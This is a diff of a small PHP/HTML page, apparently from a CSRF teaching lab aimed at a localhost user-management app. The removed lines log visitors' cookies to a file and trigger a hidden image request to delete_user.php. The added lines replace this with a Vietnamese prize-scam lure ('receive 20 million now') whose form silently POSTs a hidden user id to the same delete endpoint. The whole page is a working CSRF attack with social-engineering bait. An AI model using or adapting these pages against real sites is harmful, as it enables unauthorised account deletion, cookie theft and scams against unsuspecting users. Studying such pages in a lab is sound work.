@@ -1,33 +1,16 @@
-<?php
-session_start();
-
-// Lưu cookie (nếu cần)
-file_put_contents('cookie.txt', json_encode($_COOKIE), FILE_APPEND | LOCK_EX);
-
-// Hiển thị ID phiên (không bắt buộc)
-if (isset($_SESSION['id'])) {
-    echo 'ID phiên đăng nhập hiện tại: ' . htmlspecialchars($_SESSION['id']) . '<br>';
-}
-?>
 <!DOCTYPE html>
-<html lang="vi">
-
+<html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Hacker</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Nhận ngay 20 tr!!!!</title>
 </head>
-
 <body>
-    <h1>Trang web giả mạo</h1>
-    <p>Đây là một trang web độc hại giả lập cuộc tấn công CSRF.</p>
-    <!-- Tấn công xóa user -->
-    <?php if (isset($_SESSION['id'])) { ?>
-        <img src="http://localhost:8080/delete_user.php?id=<?php echo htmlspecialchars($_SESSION['id']); ?>" height="0"
-            width="0">
-    <?php } ?>
-    <script>
-        window.location.href = "http://localhost:8080/list_users.php";
-    </script>
+    <img src="https://quocmedia.com/wp-content/uploads/2023/07/Dang-ky-PAyoner.jpg" alt="">
+    <form action="http://localhost:8080/delete_user.php" method="POST"> 
+        đăng ký thành công nhận ngay 20 tr
+        <input type="hidden" name="id" value="15">
+        <button type="submit" name="submit" value="submit" class="btn btn-primary">Đăng ký</button>
+    </form>
 </body>
-
 </html>
